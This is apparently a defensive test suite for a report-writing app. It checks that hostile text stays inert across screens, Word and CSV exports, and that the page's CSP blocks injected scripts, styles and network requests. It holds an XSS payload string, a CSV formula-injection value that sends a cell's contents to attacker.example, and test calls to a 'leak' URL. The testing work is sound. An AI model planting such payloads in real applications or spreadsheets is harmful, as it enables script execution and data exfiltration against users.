// Untrusted input. A project file, a library or an engagement folder can come
// from someone else, so every text in them is treated as hostile: it must show as text on
// every screen, stay text in the Word file, and not become a formula in the CSV. The page's
// CSP is checked as written and as enforced (markup, styles and requests injected at run
// time are blocked).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import JSZip from 'jszip';
import { exportDocx } from '../src/export-docx/index.js';
import { findingsCsv } from '../src/app/csv.js';
import { validateProjectFile, openProjectFile } from '../src/app/project.js';
import { openLibraryFile } from '../src/app/library.js';
import { performance } from 'node:perf_hooks';

const require = createRequire(import.meta.url);
const { launch, installed } = require('./harness/driver.cjs');
const here = (p) => fileURLToPath(new URL(p, import.meta.url));
const dist = here('../dist/rootnote.html');
const out = here('./out/security/');

// Each payload, if it were ever parsed as markup or run, sets window.__pwned.
const XSS = '<img src=x onerror="window.__pwned=1"><script>window.__pwned=2</script>"\'><svg onload="window.__pwned=3">';
const FORMULA = '=HYPERLINK("https://attacker.example/?d="&A1,"Click")';

function hostileProject() {
  const d = JSON.parse(readFileSync(here('../release-template/sample-project.rootnote.json'), 'utf8'));
  d.project.title = `Report ${XSS}`;
  d.project.client = XSS;
  d.project.scope = `Scope ${XSS}`;
  d.project.executiveSummary = `Summary ${XSS}\n\n- bullet ${XSS}`;
  const f = d.findings[0];
  f.title = FORMULA;
  f.description = XSS;
  f.affectedAssets = [XSS];
  f.vulnerabilityType = XSS.slice(0, 120);
  f.references = [{ title: XSS, url: 'https://example.test/ref' }];
  // Blocks are { type: 'text' | 'image' } (this once looked for `kind` and so never set the
  // payload). Fail rather than skip if the sample ever has no text block.
  const textBlock = f.details.find((b) => b.type === 'text');
  assert.ok(textBlock, 'the sample finding has a text block for the payload');
  textBlock.text = `Steps ${XSS}`;
  d.findings[1].title = XSS;
  d.images[0].caption = `Caption ${XSS}`;
  d.images[0].originalName = `${XSS}.png`.slice(0, 255);
  return d;
}

test('the CSP as written: own script and stylesheet only, by hash; no inline, eval or remote sources', () => {
  assert.ok(existsSync(dist), 'run npm run build first');
  const html = readFileSync(dist, 'utf8');
  const csp = html.match(/http-equiv="Content-Security-Policy" content="([^"]*)"/)[1];
  const directives = Object.fromEntries(csp.split(';').map((d) => d.trim().split(/\s+/)).map(([k, ...v]) => [k, v]));
  assert.deepEqual(Object.keys(directives).sort(), ['base-uri', 'default-src', 'form-action', 'img-src', 'script-src', 'style-src']);
  assert.deepEqual(directives['default-src'], ["'none'"]);
  assert.deepEqual(directives['img-src'], ['data:', 'blob:']);
  assert.deepEqual(directives['base-uri'], ["'none'"]);
  assert.deepEqual(directives['form-action'], ["'none'"]);
  assert.doesNotMatch(csp, /unsafe-|https?:|\*/);
  const sha = (s) => `'sha256-${createHash('sha256').update(s).digest('base64')}'`;
  const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]);
  const styles = [...html.matchAll(/<style>([\s\S]*?)<\/style>/g)].map((m) => m[1]);
  assert.deepEqual([scripts.length, styles.length], [1, 1], 'one script and one stylesheet');
  assert.deepEqual(directives['script-src'], [sha(scripts[0])]);
  assert.deepEqual(directives['style-src'], [sha(styles[0])]);
  assert.doesNotMatch(html.replace(/<script>[\s\S]*?<\/script>/, ''), /\sstyle="|\son[a-z]+="/i, 'no inline style or handler attributes in the page');
});

test('hostile text stays text in the Word file, and a formula stays text in the CSV', async () => {
  const d = hostileProject();
  for (const im of d.images) im.tallMode = 'fit'; // splitting tall images needs a browser canvas
  const raw = JSON.stringify(d);
  const result = await validateProjectFile(raw, Buffer.byteLength(raw));
  assert.ok(result.ok, result.errors?.join('\n'));
  const zip = await JSZip.loadAsync(await exportDocx(d, { paperSize: 'A4' }));
  for (const name of Object.keys(zip.files).filter((n) => /^word\/.*\.xml$/.test(n) || n === 'docProps/core.xml')) {
    const xml = await zip.file(name).async('string');
    assert.doesNotMatch(xml, /<(img|script|svg)\b/i, `${name}: markup from the project became XML`);
  }
  const body = await zip.file('word/document.xml').async('string');
  assert.ok(body.includes('&lt;img src=x onerror=&quot;window.__pwned=1&quot;&gt;') || body.includes('&lt;img src=x onerror="window.__pwned=1"&gt;'), 'the text is kept, escaped');
  assert.ok(body.includes('&lt;script&gt;'));
  const csv = findingsCsv(d);
  assert.ok(csv.includes(`"'${FORMULA.replace(/"/g, '""')}"`), 'formula prefixed with an apostrophe');
  assert.ok(!/(^|,)"=/m.test(csv), 'no cell starts with =');
});

test('a file with millions of junk entries is refused at once, with a bounded error list', async () => {
  const d = JSON.parse(readFileSync(here('../release-template/sample-project.rootnote.json'), 'utf8'));
  for (const [key, open] of [['findings', openProjectFile], ['images', openProjectFile], ['entries', openLibraryFile]]) {
    const o = key === 'entries' ? { format: 'fieldnote-library', libraryVersion: 3, entries: [] } : structuredClone(d);
    o[key] = new Array(2_000_000).fill(0);
    const raw = JSON.stringify(o);
    const t0 = performance.now();
    const r = await open(raw, Buffer.byteLength(raw), {});
    const ms = performance.now() - t0;
    assert.equal(r.ok, false, key);
    assert.ok(r.errors.length <= 100, `${key}: ${r.errors.length} errors`);
    assert.ok(ms < 1500, `${key}: ${Math.round(ms)} ms`);
  }
  // Many bad fields in one finding: still bounded.
  const many = structuredClone(d);
  for (let i = 0; i < 200000; i++) many.findings[0][`x${i}`] = 0;
  const raw = JSON.stringify(many);
  const r = await openProjectFile(raw, Buffer.byteLength(raw), {});
  assert.ok(!r.ok && r.errors.length <= 100);
});

for (const [engine, port] of [['chrome', 9585], ['firefox', 9685]]) test(`hostile project, library text and folder names stay text in ${engine}; the CSP holds at run time`, { skip: !installed(engine) && `${engine} not installed`, timeout: 240000 }, async (t) => {
  assert.ok(existsSync(dist), 'run npm run build first');
  mkdirSync(out, { recursive: true });
  const file = join(out, `hostile-${engine}.rootnote.json`);
  writeFileSync(file, JSON.stringify(hostileProject()));
  const b = await launch(engine, port);
  const pwned = 'window.__pwned === undefined && document.querySelectorAll(\'img[src="x"], script:not([src]) ~ script, svg[onload]\').length === 0';
  try {
    await b.navigate(pathToFileURL(dist).href);
    assert.ok(await b.waitFor("document.getElementById('app').dataset.ready === '1'"));
    const nav = (text) => b.evaluate(`[...document.querySelectorAll('.navitem')].find((e) => e.textContent.includes(${JSON.stringify(text)})).click()`);

    await t.test('every screen shows the hostile project as text', async () => {
      await b.setFile('[data-testid=open-input]', file);
      assert.ok(await b.waitFor('window.__fieldnote.snapshot().findings.length === 8', 30000));
      for (const go of [() => nav('Details'), () => b.evaluate("document.querySelectorAll('.nav li.sortable .navitem')[0].click()"),
        () => b.evaluate("document.querySelectorAll('.nav li.sortable .navitem')[1].click()"), () => nav('Preview report'), () => nav('Check')]) {
        await go();
        await b.evaluate('new Promise((r) => setTimeout(r, 400))');
        assert.ok(await b.evaluate(pwned), await b.evaluate("document.querySelector('main')?.innerText.slice(0, 200)"));
      }
      assert.ok(await b.evaluate(`document.body.innerText.includes(${JSON.stringify('<img src=x onerror="window.__pwned=1">')}) || document.body.innerText.includes('<script>window.__pwned=2</script>')`), 'the payload is visible as text');
    });

    await t.test('hostile folder and file names in an engagements folder stay text', async () => {
      await b.evaluate(`(() => {
        const file = (name, data) => ({ kind: 'file', name, async getFile() { return new File([data], name); } });
        const dir = (name, kids) => ({ kind: 'directory', name, async *values() { yield* kids; } });
        window.__root = dir('Engagements', [dir(${JSON.stringify(XSS)}, [dir(${JSON.stringify(`2026 ${XSS}`)}, [
          file(${JSON.stringify(`${XSS}.rootnote.json`)}, JSON.stringify({ project: { title: ${JSON.stringify(XSS)}, client: '', engagementStatus: '' }, findings: [{ rating: ${JSON.stringify(XSS)} }] })),
          file(${JSON.stringify(`${XSS}.docx`)}, 'PK')])])]);
      })()`);
      await nav('Engagements');
      await b.evaluate('window.__fieldnote.useEngagementsFolder(window.__root)');
      assert.ok(await b.waitFor("document.querySelectorAll('[data-testid=engagement]').length === 1", 10000));
      assert.ok(await b.waitFor("/1 finding/.test(document.querySelector('[data-testid=engagements]').innerText)", 10000));
      assert.ok(await b.evaluate(pwned));
      assert.ok(await b.evaluate(`document.querySelector('[data-testid=customer] h2').firstChild.textContent === ${JSON.stringify(XSS)}`));
    });

    assert.deepEqual(b.errors, [], 'no page errors or CSP violations from hostile content');
    assert.deepEqual(b.requests, [], 'no network requests');

    await t.test('the CSP blocks markup, styles and requests injected at run time', async () => {
      // As if a future bug let markup through: none of it may run, style the page or reach the network.
      // Chrome announces a load before its CSP check fails it, so each announced request must
      // end as blocked by the CSP (loadingFailed, blockedReason 'csp').
      const urls = new Map();
      const failed = new Map();
      b.listeners.push((m) => {
        if (m.method === 'Network.requestWillBeSent') urls.set(m.params.requestId, m.params.request.url);
        if (m.method === 'Network.loadingFailed') failed.set(urls.get(m.params.requestId), m.params.blockedReason ?? m.params.errorText);
      });
      await b.evaluate(`document.body.insertAdjacentHTML('beforeend', ${JSON.stringify(`${XSS}<style>body { outline: 7px solid rgb(1, 2, 3) }</style><p id="probe" style="color: rgb(1, 2, 3)">probe</p>`)}); 0`);
      await b.evaluate('new Promise((r) => setTimeout(r, 500))');
      assert.equal(await b.evaluate('window.__pwned'), undefined, 'no injected handler or script ran');
      assert.notEqual(await b.evaluate('getComputedStyle(document.body).outlineColor'), 'rgb(1, 2, 3)', 'an injected <style> is not applied');
      assert.notEqual(await b.evaluate("getComputedStyle(document.getElementById('probe')).color"), 'rgb(1, 2, 3)', 'an injected style attribute is not applied');
      const fetched = await b.evaluate("fetch('https://example.test/leak?d=1').then(() => 'sent', (e) => 'blocked')");
      assert.equal(fetched, 'blocked');
      // Chrome reports a beacon as queued and then blocks it; the request list below is the check.
      await b.evaluate("(() => { try { navigator.sendBeacon('https://example.test/leak', 'x'); } catch { /* refused */ } })(); 0");
      await b.evaluate("(() => { const i = new Image(); i.src = 'https://example.test/pixel.png'; document.body.append(i); })(); 0");
      await b.evaluate('new Promise((r) => setTimeout(r, 500))');
      assert.deepEqual(b.requests.filter((u) => failed.get(u) !== 'csp'), [], 'nothing reached the network');
      if (engine === 'chrome') assert.equal(failed.get('https://example.test/pixel.png'), 'csp', 'the injected image was blocked by the CSP');
    });
  } finally {
    await b.close();
  }
});
